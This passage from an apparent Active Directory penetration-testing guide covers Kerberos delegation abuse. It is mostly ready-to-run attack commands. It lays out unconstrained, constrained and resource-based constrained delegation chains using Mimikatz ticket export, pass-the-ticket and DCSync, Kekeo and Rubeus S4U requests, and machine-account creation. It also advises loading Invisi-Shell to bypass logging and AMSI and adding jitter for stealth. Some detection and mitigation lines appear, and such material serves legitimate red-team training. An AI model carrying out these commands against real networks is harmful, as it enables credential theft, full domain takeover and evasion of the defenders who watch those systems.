Write-Host "13. Once we get an DA token we can Reuse the token using Invoke-Mimikatz" -ForegroundColor White
Write-Host "14. Now we can access any service on the DC" -ForegroundColor White

Write-Host "`n🔧 COMPLETE UNCONSTRAINED DELEGATION COMMANDS:" -ForegroundColor Yellow

Write-Host "`nStep 1: Enumerate Computers with Unconstrained Delegation" -ForegroundColor Cyan
Write-Host "# Find computers with unconstrained delegation" -ForegroundColor Gray
Write-Host "Get-NetComputer -UnConstrained" -ForegroundColor White

Write-Host "`nStep 2: Check for Available Tokens and Save to Disk" -ForegroundColor Cyan
Write-Host "# Check if a token is available and save to disk" -ForegroundColor Gray
Write-Host "Invoke-Mimikatz -Command '\"sekurlsa::tickets /export\"'" -ForegroundColor White

Write-Host "`nStep 3: Reuse Captured DA Token" -ForegroundColor Cyan
Write-Host "# Reuse of the DA token" -ForegroundColor Gray
Write-Host "Invoke-Mimikatz -Command '\"kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi\"'" -ForegroundColor White

Write-Host "`nStep 4: Pull Administrator Sessions (Printer Bug)" -ForegroundColor Cyan
Write-Host "# Pull any sessions if logged on with administrator/ Printer Bug" -ForegroundColor Gray
Write-Host "Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose" -ForegroundColor White

Write-Host "`n⚠️ IMPORTANT NOTES:" -ForegroundColor Red
Write-Host "- Unconstrained delegation is extremely dangerous" -ForegroundColor White
Write-Host "- Can lead to complete domain compromise" -ForegroundColor White
Write-Host "- Monitor for TGT capture events" -ForegroundColor White
Write-Host "- Use legitimate services for stealth" -ForegroundColor White
```

#### **Unconstrained Delegation Target Analysis**
```powershell
# Unconstrained Delegation Target Analysis
Write-Host "=== UNCONSTRAINED DELEGATION TARGET ANALYSIS ===" -ForegroundColor Green

Write-Host "`n🎯 HIGH-VALUE TARGETS:" -ForegroundColor Yellow
Write-Host "1. Domain Controllers (CRITICAL)" -ForegroundColor Red
Write-Host "2. SQL Servers (HIGH)" -ForegroundColor Red
Write-Host "3. Web Servers (HIGH)" -ForegroundColor Red
Write-Host "4. File Servers (HIGH)" -ForegroundColor Red

Write-Host "`n🔍 TARGET IDENTIFICATION:" -ForegroundColor Yellow
Write-Host "# Find all unconstrained delegation objects" -ForegroundColor Cyan
Write-Host "Get-DomainObject -Unconstrained -Properties Name, ObjectClass, DistinguishedName" -ForegroundColor White

Write-Host "# Categorize by risk level" -ForegroundColor Cyan
Write-Host "$criticalTargets = Get-DomainComputer -Unconstrained | Where-Object { $_.Name -like '*DC*' }" -ForegroundColor White
Write-Host "$highTargets = Get-DomainComputer -Unconstrained | Where-Object { $_.Name -like '*SQL*' -or $_.Name -like '*WEB*' }" -ForegroundColor White

Write-Host "`n📊 RISK ASSESSMENT:" -ForegroundColor Yellow
Write-Host "Risk Level: CRITICAL - Complete domain compromise possible" -ForegroundColor Red
Write-Host "Attack Vector: TGT capture from high-privilege users" -ForegroundColor Red
Write-Host "Detection: Monitor for unusual TGT requests" -ForegroundColor Yellow
Write-Host "Mitigation: Disable unconstrained delegation" -ForegroundColor Green
```

### **2. 🔒 Complete Constrained Delegation Attack Workflow**

#### **Step-by-Step Constrained Delegation Execution**
```powershell
# Complete Constrained Delegation Attack Workflow (CRITICAL MISSING CONTENT)
Write-Host "=== COMPLETE CONSTRAINED DELEGATION ATTACK WORKFLOW ===" -ForegroundColor Red

Write-Host "`n🎯 ATTACK OVERVIEW:" -ForegroundColor Yellow
Write-Host "Constrained delegation allows services to impersonate users to access SPECIFIC services." -ForegroundColor White

Write-Host "`n📋 PREREQUISITES:" -ForegroundColor Yellow
Write-Host "1. Control of account with constrained delegation enabled" -ForegroundColor White
Write-Host "2. Target service in delegation scope" -ForegroundColor White
Write-Host "3. Valid user credentials for impersonation" -ForegroundColor White

Write-Host "`n🚀 EXECUTION STEPS:" -ForegroundColor Yellow
Write-Host "1. List all the users having Constrained Delegation" -ForegroundColor White
Write-Host "2. Keep a note of the msDS-AllowedToDelegateTo value" -ForegroundColor White
Write-Host "3. Request for a TGT using the hash of the user with CD using kekeo" -ForegroundColor White
Write-Host "4. Keep a note of the TGT return ticket" -ForegroundColor White
Write-Host "5. Now request a TGS with the 2nd step and 4th step values as parameters" -ForegroundColor White
Write-Host "6. Keep a note of the TGS return Ticket" -ForegroundColor White
Write-Host "7. Now we can inject the TGS return Ticket with Invoke-Mimikatz" -ForegroundColor White
Write-Host "8. We can now list the file systems of that account" -ForegroundColor White
Write-Host "9. But if the user DC we can do the same process and then do a DCSync attack" -ForegroundColor White

Write-Host "`n🔧 COMPLETE CONSTRAINED DELEGATION COMMANDS:" -ForegroundColor Yellow

Write-Host "`nStep 1: Enumerate Users and Computers with CD Enabled" -ForegroundColor Cyan
Write-Host "# Enumerate users and computers with CD enabled" -ForegroundColor Gray
Write-Host "Get-DomainUser -TrustedToAuth" -ForegroundColor White
Write-Host "Get-DomainComputer -TrustedToAuth" -ForegroundColor White

Write-Host "`nStep 2: Request TGT Using Kekeo" -ForegroundColor Cyan
Write-Host "# Requesting a TGT" -ForegroundColor Gray
Write-Host "tgt::ask /user:websvc /domain:domain.local /rc4:cc098f204c5887eaa8253e7c2749156f" -ForegroundColor White
Write-Host "tgt::ask /user:dcorp-adminsrv /domain:domain.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67" -ForegroundColor White

Write-Host "`nStep 3: Request TGS for Target Service" -ForegroundColor Cyan
Write-Host "# Request a TGS" -ForegroundColor Gray
Write-Host "tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCAL" -ForegroundColor White
Write-Host "tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:time/computer.domain.LOCAL|ldap/computer.domain.LOCAL" -ForegroundColor White

Write-Host "`nStep 4: Inject the Service Ticket" -ForegroundColor Cyan
Write-Host "# Inject the ticket" -ForegroundColor Gray
Write-Host "Invoke-Mimikatz -Command '\"kerberos::ptt TGS.kirbi\"'" -ForegroundColor White

Write-Host "`nStep 5: Execute DCSync Attack (if targeting DC)" -ForegroundColor Cyan
Write-Host "# Execute DCSync" -ForegroundColor Gray
Write-Host "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'" -ForegroundColor White

Write-Host "`n⚠️ IMPORTANT NOTES:" -ForegroundColor Red
Write-Host "- Constrained delegation limits scope but can still be dangerous" -ForegroundColor White
Write-Host "- Target high-value services (CIFS, LDAP, RPCSS)" -ForegroundColor White
Write-Host "- Can lead to privilege escalation and lateral movement" -ForegroundColor White
Write-Host "- Monitor for unusual service ticket requests" -ForegroundColor Yellow
```

#### **Constrained Delegation Target Analysis**
```powershell
# Constrained Delegation Target Analysis
Write-Host "=== CONSTRAINED DELEGATION TARGET ANALYSIS ===" -ForegroundColor Green

Write-Host "`n🎯 HIGH-VALUE DELEGATION TARGETS:" -ForegroundColor Yellow
Write-Host "1. CIFS (File access) - CRITICAL" -ForegroundColor Red
Write-Host "2. LDAP (Directory access) - CRITICAL" -ForegroundColor Red
Write-Host "3. RPCSS (Remote procedure calls) - CRITICAL" -ForegroundColor Red
Write-Host "4. HTTP (Web services) - HIGH" -ForegroundColor Yellow
Write-Host "5. MSSQLSvc (SQL Server) - HIGH" -ForegroundColor Yellow

Write-Host "`n🔍 DELEGATION SCOPE ANALYSIS:" -ForegroundColor Yellow
Write-Host "# Analyze delegation targets for attack potential" -ForegroundColor Cyan
Write-Host "$allDelegationTargets = @()" -ForegroundColor White
Write-Host "$constrainedUsers = Get-DomainUser -TrustedToAuth -Properties msDS-AllowedToDelegateTo" -ForegroundColor White

Write-Host "# Collect all delegation targets" -ForegroundColor Cyan
Write-Host "foreach (`$user in `$constrainedUsers) {" -ForegroundColor White
Write-Host "    if (`$user.'msDS-AllowedToDelegateTo') {" -ForegroundColor White
Write-Host "        foreach (`$target in `$user.'msDS-AllowedToDelegateTo') {" -ForegroundColor White
Write-Host "            `$allDelegationTargets += @{ Target = `$target; Source = `$user.Name }" -ForegroundColor White
Write-Host "        }" -ForegroundColor White
Write-Host "    }" -ForegroundColor White
Write-Host "}" -ForegroundColor White

Write-Host "`n📊 RISK ASSESSMENT:" -ForegroundColor Yellow
Write-Host "Risk Level: HIGH - Limited scope but dangerous delegation" -ForegroundColor Yellow
Write-Host "Attack Vector: Service impersonation via S4U2Self" -ForegroundColor Yellow
Write-Host "Detection: Monitor for unusual service ticket requests" -ForegroundColor Yellow
Write-Host "Mitigation: Limit delegation scope and monitor usage" -ForegroundColor Green
```

---

## 🎯 CONCLUSION

**Kerberos Delegation Abuse** provides comprehensive techniques for discovering and exploiting delegation configurations. By mastering these techniques, you can:

- **Identify all delegation types** and their security implications
- **Enumerate delegation configurations** using multiple tools
- **Execute delegation abuse attacks** for privilege escalation
- **Perform advanced delegation attacks** including multi-hop and cross-forest
- **Build comprehensive attack strategies** based on delegation analysis

### **🚀 Key Success Factors**
1. **Comprehensive Enumeration**: Use multiple tools for complete delegation discovery
2. **Risk Assessment**: Evaluate delegation targets based on type and scope
3. **Attack Planning**: Plan attacks based on delegation relationships
4. **Tool Mastery**: Master Rubeus, Mimikatz, and PowerView for delegation abuse
5. **OPSEC Awareness**: Understand detection mechanisms and evasion techniques

---

**🔓 Remember**: Delegation abuse is like having a master key that opens multiple doors - you need to understand which doors you can open and how to use the key effectively!**

---

## 📚 **NEXT STEPS**

After mastering Delegation Abuse, continue with:
- **Advanced Attacks**: See [16_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)
- **Basic Kerberos**: See [13_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md)
- **SPN Enumeration**: See [14_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)

---

## ⚔️ Execution

### Resource-Based Constrained Delegation (RBCD)
```powershell
# 1) Create attacker-controlled machine account (PowerMad or net)
# New-MachineAccount -MachineAccount attacker$ -Password 'P@ssw0rd!' -Verbose

# 2) Set msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET computer to attacker machine
# Using PowerView (dev) style
$SID = (Get-DomainComputer attacker$).objectsid
$sddl = "O:BAD:(A;;GR;;;${SID})(A;;GW;;;${SID})"
Set-DomainObject -Identity 'TARGET$' -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$sddl}

# 3) S4U2Self + S4U2Proxy with Rubeus from attacker machine account
.\Rubeus.exe s4u /user:attacker$ /rc4:<attacker_machine_NTLM> \
  /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /ptt

# 4) Use injected service ticket
ls \\TARGET\c$\
```
- For constrained/unconstrained workflows, see earlier sections and `16_Kerberos_Advanced_Attacks.md`. Detection: `11_Detection_Blue_Team.md`.

---

## At‑a‑Glance

### Command Quick‑Reference
| Focus | Tool | Example | Notes |
| - | - | - | - |
| Unconstrained | Get-DomainComputer -Unconstrained | Get-DomainComputer -Unconstrained | Critical risk
| Constrained | Get-DomainUser -TrustedToAuth | Get-DomainUser -TrustedToAuth | Scope via msDS‑AllowedToDelegateTo
| RBCD | msDS-AllowedToActOnBehalfOfOtherIdentity | Get-DomainComputer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Parse SDDL

### Pivot Matrix
| Signal | Pivot | Goal |
| - | - | - |
| Unconstrained on app server | 26_Kerberos_Advanced_Attacks.md | TGT capture → golden path
| CD to CIFS/LDAP | 26_Kerberos_Advanced_Attacks.md | S4U2Self/Proxy file/DC access
| RBCD present | 26_Kerberos_Advanced_Attacks.md | Write SD → S4U chain

## Stealth & Loading
Use [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md) for stealth session and prep. Continue here with delegation‑specific discovery/abuse only.

## CyberCorp Persona
- Persona: Elena Ionescu, Identity Engineer. Task: enumerate CD/RBCD edges for FILE01/SQL01 tiers; avoid broad sweeps.

## Delegation Topology (unique)


## Lab vs Production
- Stealth: list only identities with flags; expand a few targets; never dump full SDs broadly.
- Lab: export full sets, parse SDs, simulate S4U chains.

## Detection/OPSEC
- Correlate S4U requests with delegation edges; watch for sudden new msDS‑AllowedToActOnBehalfOfOtherIdentity writes.
- Prefer MS‑signed enumeration first, scope queries, limit properties, add jitter (3–6s) in prod.
- Validate DNS/LDAP/ADWS timing and keep transport consistent during baselines.

> **🔒 STEALTH REQUIREMENT**: **Invisi-Shell** must be loaded before any delegation enumeration or abuse in production environments to bypass logging and AMSI detection.

## Cleanup
```powershell
Remove-Variable criticalTargets,highTargets,allDelegationTargets -ErrorAction SilentlyContinue
```

---

## 🔗 **CROSS-REFERENCES & INTEGRATION**

### 📚 Related Techniques
- [23_Kerberos_Basic_Enumeration.md](./23_Kerberos_Basic_Enumeration.md)
- [24_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md)
- [26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)

### 🛠️ Tool Dependencies
- [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md)
- [02_Network_Enumeration.md](./02_Network_Enumeration.md)
- [03_DNS_Enumeration.md](./03_DNS_Enumeration.md)

---

[Prev: 24_SPN_Enumeration_Techniques.md](./24_SPN_Enumeration_Techniques.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md)
